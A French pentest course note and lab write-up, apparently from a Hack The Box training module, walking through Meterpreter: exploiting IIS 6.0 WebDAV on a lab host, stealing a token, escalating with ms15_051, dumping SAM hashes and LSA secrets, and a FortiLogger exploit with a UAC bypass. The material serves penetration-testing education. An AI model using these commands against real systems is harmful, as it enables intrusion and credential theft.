[[Metasploitable HTB]]

La `charge utile` (payload) `Meterpreter` est un type spécifique de `charge utile` polyvalente et extensible qui utilise l' `injection de DLL` (`DLL injection`) pour s'assurer que la connexion à l'hôte victime est stable et difficile à détecter avec de simples vérifications, et peut être configurée pour être persistante après les redémarrages ou les changements de système. De plus, Meterpreter réside entièrement dans la mémoire de l'hôte distant et ne laisse aucune trace sur le disque dur, ce qui le rend difficile à détecter avec les techniques d'investigation numérique (forensic) conventionnelles.

Il est surnommé le couteau suisse du `pentesting`, et pour une bonne raison. Le but de Meterpreter est d'améliorer spécifiquement nos procédures de post-exploitation, en nous offrant un ensemble d'outils pertinents triés sur le volet pour une énumération plus directe de l'hôte cible de l'intérieur. Il peut nous aider à trouver diverses techniques d'élévation de privilèges, des techniques d'évasion d'antivirus, à approfondir la recherche de vulnérabilités, à fournir un accès persistant, à pivoter, etc.

Pour une lecture intéressante, consultez cet [article](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/) sur les `charges utiles Meterpreter sans stage` (stageless) et cet [article](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion) sur la modification des modèles Metasploit pour l'évasion. Ces sujets sortent du cadre de ce module, mais nous devons être conscients de ces possibilités.

---

## Exécuter Meterpreter

Pour exécuter Meterpreter, il suffit de sélectionner l'une de ses versions dans la sortie de `show payloads`, en tenant compte du type de connexion et du système d'exploitation que nous attaquons.

Lorsque l'exploit est terminé, les événements suivants se produisent :

- La cible exécute le `stager` initial. Il s'agit généralement d'un `bind`, `reverse`, `findtag`, `passivex`, etc.
- Le `stager` charge la DLL préfixée par Reflective. Le `stub` Reflective gère le chargement/l'injection de la DLL.
- Le cœur de Meterpreter s'initialise, établit une liaison chiffrée en AES sur le `socket`, et envoie une requête GET. Metasploit reçoit ce GET et configure le client.
- Enfin, Meterpreter charge les extensions. Il chargera toujours `stdapi` et `priv` si le module donne des droits administratifs. Toutes ces extensions sont chargées via un chiffrement AES.

Chaque fois que la `charge utile` Meterpreter est envoyée et exécutée sur le système cible, nous recevons un `shell Meterpreter`. Nous pouvons alors immédiatement lancer la commande `help` pour voir ce que le `shell Meterpreter` est capable de faire.

#### MSF - Commandes Meterpreter

        shellsession
`meterpreter > help  Core Commands =============      Command                   Description     -------                   -----------     ?                         Menu d'aide     background                Met la session actuelle en arrière-plan     bg                        Alias pour background     bgkill                    Arrête un script meterpreter en arrière-plan     bglist                    Liste les scripts en arrière-plan en cours d'exécution     bgrun                     Exécute un script meterpreter en tant que thread d'arrière-plan     channel                   Affiche des informations ou contrôle les canaux actifs     close                     Ferme un canal     disable_unicode_encoding  Désactive l'encodage des chaînes unicode     enable_unicode_encoding   Active l'encodage des chaînes unicode     exit                      Termine la session meterpreter     get_timeouts              Obtient les valeurs de timeout de la session actuelle     guid                      Obtient le GUID de la session     help                      Menu d'aide     info                      Affiche des informations sur un module Post     irb                       Ouvre un shell Ruby interactif sur la session actuelle     load                      Charge une ou plusieurs extensions meterpreter     machine_id                Obtient l'ID MSF de la machine attachée à la session     migrate                   Migre le serveur vers un autre processus     pivot                     Gère les écouteurs de pivot     pry                       Ouvre le débogueur Pry sur la session actuelle     quit                      Termine la session meterpreter     read                      Lit des données depuis un canal     resource                  Exécute les commandes stockées dans un fichier     run                       Exécute un script meterpreter ou un module Post     secure                    (Re)Négocie le chiffrement des paquets TLV sur la session     sessions                  Bascule rapidement vers une autre session     set_timeouts              Définit les valeurs de timeout de la session actuelle     sleep                     Force Meterpreter à se taire, puis rétablit la session.     transport                 Change le mécanisme de transport actuel     use                       Alias obsolète pour "load"     uuid                      Obtient l'UUID de la session actuelle     write                     Écrit des données dans un canal`

Certaines de ces commandes sont également disponibles dans l'aide-mémoire du module à titre de référence.

L'idée principale à retenir à propos de Meterpreter est qu'il est tout aussi efficace que d'obtenir un `shell` direct sur le système d'exploitation cible, mais avec plus de fonctionnalités. Les développeurs de Meterpreter ont défini des objectifs de conception clairs pour que le projet connaisse une croissance fulgurante en termes de facilité d'utilisation à l'avenir. Meterpreter doit être :

- Furtif
- Puissant
- Extensible

---

## Furtif

Meterpreter, une fois lancé et arrivé sur la cible, réside entièrement en mémoire et n'écrit rien sur le disque. Aucun nouveau processus n'est créé, car Meterpreter s'injecte dans un processus compromis. De plus, il peut effectuer des migrations de processus d'un processus en cours d'exécution à un autre.

Avec la version maintenant mise à jour `msfconsole-v6`, toutes les communications de la `charge utile` Meterpreter entre l'hôte cible et nous sont chiffrées en AES pour garantir la confidentialité et l'intégrité des communications de données.

Tout cela ne laisse que des preuves limitées pour l'investigation numérique et a peu d'impact sur la machine victime.

---

## Puissant

L'utilisation par Meterpreter d'un système de communication par canaux entre l'hôte cible et l'attaquant s'avère très utile. Nous pouvons le constater directement lorsque nous générons immédiatement un `shell` du système d'exploitation hôte à l'intérieur de notre `stage` Meterpreter en ouvrant un canal dédié pour celui-ci. Cela permet également l'utilisation de trafic chiffré en AES.

---

## Extensible

Les fonctionnalités de Meterpreter peuvent être constamment augmentées à l'exécution et chargées via le réseau. Sa structure modulaire permet également d'ajouter de nouvelles fonctionnalités sans avoir à le recompiler.

---

## Utiliser Meterpreter

Nous avons déjà abordé les bases de Meterpreter dans la section sur les `charges utiles`. Nous allons maintenant examiner les véritables atouts du `shell` Meterpreter et comment il peut renforcer l'efficacité de l'évaluation et faire gagner du temps lors d'une mission. Nous commençons par effectuer un scan de base sur une cible connue. Nous allons le faire à la carte, en réalisant tout depuis `msfconsole` pour bénéficier du suivi des données sur notre cible.

#### MSF - Scanner la cible

        shellsession
`msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15  [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC [*] Nmap: Nmap scan report for 10.10.10.15 [*] Nmap: Host is up (0.021s latency). [*] Nmap: Not shown: 65534 filtered ports [*] Nmap: PORT   STATE SERVICE VERSION [*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0 [*] Nmap: | http-methods: [*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT [*] Nmap: |_http-server-header: Microsoft-IIS/6.0 [*] Nmap: |_http-title: Under Construction [*] Nmap: | http-webdav-scan: [*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH [*] Nmap: |   WebDAV type: Unknown [*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK [*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT [*] Nmap: |_  Server Type: Microsoft-IIS/6.0 [*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds   msf6 > hosts  Hosts =====  address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments -------      ---  ----  -------  ---------  -----  -------  ----  -------- 10.10.10.15             Unknown                    device            msf6 > services  Services ========  host         port  proto  name  state  info ----         ----  -----  ----  -----  ---- 10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0`

Ensuite, nous recherchons des informations sur les services en cours d'exécution sur cette machine. Plus précisément, nous voulons explorer le port 80 et le type de service web qui y est hébergé.

http://10.10.10.15:80

![Page 'En construction' avec des instructions pour accéder à l'aide d'IIS, y compris les étapes pour exécuter inetmgr et trouver les rubriques d'aide dans les services d'information Internet.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/39/S12_SS01.png)

Nous remarquons qu'il s'agit d'un site web en construction - rien à voir ici en ce qui concerne le web. Cependant, en examinant de plus près la fin de la page web et le résultat du scan Nmap, nous remarquons que le serveur exécute `Microsoft IIS httpd 6.0`. Nous poursuivons donc nos recherches dans cette direction, en cherchant les vulnérabilités courantes pour cette version d'IIS. Après quelques recherches, nous trouvons le marqueur suivant pour une vulnérabilité répandue : `CVE-2017-7269`. Un module Metasploit a également été développé pour celle-ci.

#### MSF - Rechercher un exploit

        shellsession
`msf6 > search iis_webdav_upload_asp  Matching Modules ================     #  Name                                       Disclosure Date  Rank       Check  Description    -  ----                                       ---------------  ----       -----  -----------    0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution   msf6 > use 0  [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp   msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options  Module options (exploit/windows/iis/iis_webdav_upload_asp):     Name          Current Setting        Required  Description    ----          ---------------        --------  -----------    HttpPassword                         no        Le mot de passe HTTP à spécifier pour l'authentification    HttpUsername                         no        Le nom d'utilisateur HTTP à spécifier pour l'authentification    METHOD        move                   yes       Déplacer ou copier le fichier sur le système distant de .txt -> .asp (Accepté : move, copy)    PATH          /metasploit%RAND%.asp  yes       Le chemin pour tenter l'envoi    Proxies                              no        Une chaîne de proxys au format type:hôte:port[,type:hôte:port][...]    RHOSTS                               yes       L'hôte(s) cible(s), l'identifiant de plage CIDR, ou le fichier d'hôtes avec la syntaxe 'file:<path>'    RPORT         80                     yes       Le port cible (TCP)    SSL           false                  no        Négocier SSL/TLS pour les connexions sortantes    VHOST                                no        Hôte virtuel du serveur HTTP   Payload options (windows/meterpreter/reverse_tcp):     Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  process          yes       Technique de sortie (Accepté : '', seh, thread, process, none)    LHOST     10.10.239.181   yes       L'adresse d'écoute (une interface peut être spécifiée)    LPORT     4444             yes       Le port d'écoute   Exploit target:     Id  Name    --  ----    0   Automatic`

Nous procédons à la configuration des paramètres nécessaires. Pour l'instant, ce seront `LHOST` et `RHOST`, car tout le reste sur la cible semble fonctionner avec la configuration par défaut.

#### MSF - Configurer l'exploit et la charge utile

        shellsession
`msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15  RHOST => 10.10.10.15   msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0  LHOST => tun0   msf6 exploit(windows/iis/iis_webdav_upload_asp) > run  [*] Started reverse TCP handler on 10.10.14.26:4444  [*] Checking /metasploit28857905.asp [*] Uploading 612435 bytes to /metasploit28857905.txt... [*] Moving /metasploit28857905.txt to /metasploit28857905.asp... [*] Executing /metasploit28857905.asp... [*] Sending stage (175174 bytes) to 10.10.10.15 [*] Deleting /metasploit28857905.asp (this doesn't always work)... [!] Deletion failed on /metasploit28857905.asp [403 Forbidden] [*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000  meterpreter >` 

Nous avons notre `shell` Meterpreter. Cependant, regardez attentivement la sortie ci-dessus. Nous pouvons voir qu'un fichier `.asp` nommé `metasploit28857905` existe sur le système cible en ce moment même. Une fois le `shell` Meterpreter obtenu, comme mentionné précédemment, il résidera en mémoire. Par conséquent, le fichier n'est pas nécessaire, et `msfconsole` a tenté de le supprimer, ce qui a échoué en raison des permissions d'accès. Laisser de telles traces n'est pas bénéfique pour l'attaquant et crée une énorme responsabilité.

Du point de vue de l'administrateur système, trouver des fichiers qui correspondent à ce type de nom ou à de légères variations peut s'avérer bénéfique pour arrêter une attaque en plein milieu. Cibler des correspondances regex sur des noms de fichiers ou des signatures comme ci-dessus ne permettra même pas à un attaquant de générer un `shell` Meterpreter avant d'être arrêté par des mesures de sécurité correctement configurées.

Nous poursuivons avec nos exploits. En essayant de voir avec quel utilisateur nous nous exécutons, nous recevons un message d'accès refusé. Nous devrions essayer de migrer notre processus vers un utilisateur avec plus de privilèges.

#### MSF - Migration Meterpreter

        shellsession
`meterpreter > getuid  [-] 1055: Operation failed: Access is denied.   meterpreter > ps  Process List ============   PID   PPID  Name               Arch  Session  User                          Path  ---   ----  ----               ----  -------  ----                          ----  0     0     [System Process]                                                  4     0     System                                                            216   1080  cidaemon.exe                                                      272   4     smss.exe                                                          292   1080  cidaemon.exe                                                     <...SNIP...>   1712  396   alg.exe                                                           1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe  1920  396   dllhost.exe                                                       2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe  2312  592   wmiprvse.exe                                                      3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe  3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe  4076  1080  cidaemon.exe                                                       meterpreter > steal_token 1836  Stolen token with username: NT AUTHORITY\NETWORK SERVICE   meterpreter > getuid  Server username: NT AUTHORITY\NETWORK SERVICE`

Maintenant que nous avons établi un certain niveau de privilège dans le système, il est temps de l'élever. Nous cherchons donc quelque chose d'intéressant et, dans l'emplacement `C:\Inetpub\`, nous trouvons un dossier intéressant nommé `AdminScripts`. Cependant, nous n'avons malheureusement pas la permission de lire ce qui se trouve à l'intérieur.

#### MSF - Interagir avec la cible

        cmd
`c:\Inetpub>dir  dir  Volume in drive C has no label.  Volume Serial Number is 246C-D7FE   Directory of c:\Inetpub  04/12/2017  05:17 PM    <DIR>          . 04/12/2017  05:17 PM    <DIR>          .. 04/12/2017  05:16 PM    <DIR>          AdminScripts 09/03/2020  01:10 PM    <DIR>          wwwroot                0 File(s)              0 bytes                4 Dir(s)  18,125,160,448 bytes free   c:\Inetpub>cd AdminScripts  cd AdminScripts Access is denied.`

Nous pouvons facilement décider d'exécuter le module `local exploit suggester`, en le rattachant à la session Meterpreter actuellement active. Pour ce faire, nous mettons en arrière-plan la session Meterpreter actuelle, recherchons le module dont nous avons besoin, et définissons l'option `SESSION` sur le numéro d'index de la session Meterpreter, liant ainsi le module à celle-ci.

#### MSF - Gestion de session

        shellsession
`meterpreter > bg  Background session 1? [y/N]  y   msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester  Matching Modules ================     #  Name                                      Disclosure Date  Rank    Check  Description    -  ----                                      ---------------  ----    -----  -----------    0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester   msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0 msf6 post(multi/recon/local_exploit_suggester) > show options  Module options (post/multi/recon/local_exploit_suggester):     Name             Current Setting  Required  Description    ----             ---------------  --------  -----------    SESSION                           yes       La session sur laquelle exécuter ce module    SHOWDESCRIPTION  false            yes       Affiche une description détaillée des exploits disponibles   msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1  SESSION => 1   msf6 post(multi/recon/local_exploit_suggester) > run  [*] 10.10.10.15 - Collecting local exploits for x86/windows... [*] 10.10.10.15 - 34 exploit checks are being tried... nil versions are discouraged and will be deprecated in Rubygems 4 [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed msf6 post(multi/recon/local_exploit_suggester) >` 

L'exécution du module de reconnaissance nous présente une multitude d'options. En les parcourant une par une, nous tombons sur l'entrée `ms15_051_client_copy_image`, qui s'avère fructueuse. Cet exploit nous place directement dans un `shell root`, nous donnant un contrôle total sur le système cible.

#### MSF - Élévation de privilèges

        shellsession
`msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images  [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp   msf6 exploit(windows/local/ms15_051_client_copy_image) > show options  Module options (exploit/windows/local/ms15_051_client_copy_image):     Name     Current Setting  Required  Description    ----     ---------------  --------  -----------    SESSION                   yes       La session sur laquelle exécuter ce module.   Payload options (windows/meterpreter/reverse_tcp):     Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  thread           yes       Technique de sortie (Accepté : '', seh, thread, process, none)    LHOST     46.101.239.181   yes       L'adresse d'écoute (une interface peut être spécifiée)    LPORT     4444             yes       Le port d'écoute   Exploit target:     Id  Name    --  ----    0   Windows x86   msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1  session => 1   msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0  LHOST => tun0   msf6 exploit(windows/local/ms15_051_client_copy_image) > run  [*] Started reverse TCP handler on 10.10.14.26:4444  [*] Launching notepad to host the exploit... [+] Process 844 launched. [*] Reflectively injecting the exploit DLL into 844... [*] Injecting exploit into 844... [*] Exploit injected. Injecting payload into 844... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.15 [*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000   meterpreter > getuid  Server username: NT AUTHORITY\SYSTEM`

À partir de là, nous pouvons utiliser la pléthore de fonctionnalités de Meterpreter. Par exemple, extraire des `hashes` (empreintes), usurper l'identité de n'importe quel processus, et autres.

#### MSF - Extraire les Hashes

        shellsession
`meterpreter > hashdump  Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca::: ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88::: IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16::: Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c::: SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::   meterpreter > lsa_dump_sam  [+] Running as SYSTEM [*] Dumping SAM Domain : GRANNY SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb Local SID : S-1-5-21-1709780765-3897210020-3926566182  SAMKey : 37ceb48682ea1b0197c7ab294ec405fe  RID  : 000001f4 (500) User : Administrator   Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf   Hash NTLM: d6908f022af0373e9e21b8a241c86dca  RID  : 000001f5 (501) User : Guest  RID  : 000003e9 (1001) User : SUPPORT_388945a0   Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6  RID  : 000003eb (1003) User : IUSR_GRANPA   Hash LM  : a274b4532c9ca5cdf684351fab962e86   Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88  RID  : 000003ec (1004) User : IWAM_GRANPA   Hash LM  : 95d112c4da2348b599183ac6b1d67840   Hash NTLM: a97f39734c21b3f6155ded7821d04d16  RID  : 000003ef (1007) User : ASPNET   Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b   Hash NTLM: edc0d5506804653f58964a2376bbd769  RID  : 000003f1 (1009) User : Lakis   Hash LM  : f927b0679b3cc0e192410d9b0b40873c   Hash NTLM: 3064b6fc432033870c6730228af7867c`

#### MSF - Extraire les secrets LSA de Meterpreter

        shellsession
`meterpreter > lsa_dump_secrets  [+] Running as SYSTEM [*] Dumping LSA secrets Domain : GRANNY SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb  Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 ) Domain name : HTB  Policy subsystem is : 1.7 LSA Key : ada60ee248094ce782807afae1711b2c  Secret  : aspnet_WP_PASSWORD cur/text: Q5C'181g16D'=F  Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2   Secret  : DPAPI_SYSTEM cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63      full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63     m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63  Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75 cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588 cur/hex : 00 f2 d1 31 e2 11 d3 01   Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d  Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d  Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d  Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d  Secret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A} cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f  old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16   Secret  : NL$KM cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f   Secret  : SAC  Secret  : SAI  Secret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}  Secret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}  Secret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\LocalService  Secret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\LocalService  Secret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\NetworkService  Secret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\NetworkService  Secret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\NetworkService  Secret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\NetworkService  Secret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\LocalService  Secret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\NetworkService  Secret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\NetworkService  Secret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\NetworkService  Secret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\LocalService  Secret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\LocalService  Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\LocalService`

À partir de ce point, si la machine était connectée à un réseau plus étendu, nous pourrions utiliser ce butin pour pivoter à travers le système, obtenir l'accès à des ressources internes et usurper l'identité d'utilisateurs avec un niveau d'accès plus élevé si la posture de sécurité globale du réseau est faible.

Lab de Fin 

![Pasted image 20260912022701.png](/assets/img/writeups/Pasted image 20260912022701.png)

on commence avec un nmap classique de l'ip cible 

![Pasted image 20260912023525.png](/assets/img/writeups/Pasted image 20260912023525.png)

on va commencer par le finger print http ici on a un http_title à  : FortiLogger

on va chercher le mot clé FortiLogger pour voir ce qu'on a dans msfconsle 

![Pasted image 20260912023808.png](/assets/img/writeups/Pasted image 20260912023808.png) 
on a un exploit basé dur windows tand mieux alors cars le résultat du nmapt fait penser à cet OS 

![Pasted image 20260912024150.png](/assets/img/writeups/Pasted image 20260912024150.png)

la version est vulnérable  donc on peut commencer l'exploit 
![Pasted image 20260912024327.png](/assets/img/writeups/Pasted image 20260912024327.png)
on a l'utilisateur de login 

maintenant l'élevation de privilège 

on va chercher un local exploit suggester 

![Pasted image 20260912024938.png](/assets/img/writeups/Pasted image 20260912024938.png)

une fois trouver on verra qu'il abesoin de session sur la quelles travaller 
et voici les sessions valides pour notre meterpreter 
![Pasted image 20260912025141.png](/assets/img/writeups/Pasted image 20260912025141.png)
une 

maintenant passons là en paramètre du module et on le lance 


![Pasted image 20260912025257.png](/assets/img/writeups/Pasted image 20260912025257.png)
ilva kuste essayé de trouver de potentielles faille sur l'hote de la session cible 

les modules qui sont possible exploitables sont 
![Pasted image 20260912025553.png](/assets/img/writeups/Pasted image 20260912025553.png)

et les nons exploitables sont : 
![Pasted image 20260912025617.png](/assets/img/writeups/Pasted image 20260912025617.png)

on a plusieur exploit mais celle m'interresser plus bypassuac_comhijack 
### Le principe

Sur Windows, quand un utilisateur est membre du groupe Administrateurs mais que son processus tourne en **token "medium integrity"** (UAC actif), certaines actions nécessitent une élévation — normalement via le popup UAC. Ce module exploite le fait que certains **binaires Windows auto-élevés** (marqués "autoElevate" dans leur manifeste, comme `sdclt.exe`, `wsreset.exe`, etc. selon la variante) chargent des objets COM sans vérifier correctement leur chemin d'origine.


on a une erreur d'architecture  on essai un autre  

![Pasted image 20260912031000.png](/assets/img/writeups/Pasted image 20260912031000.png)

![Pasted image 20260912031036.png](/assets/img/writeups/Pasted image 20260912031036.png)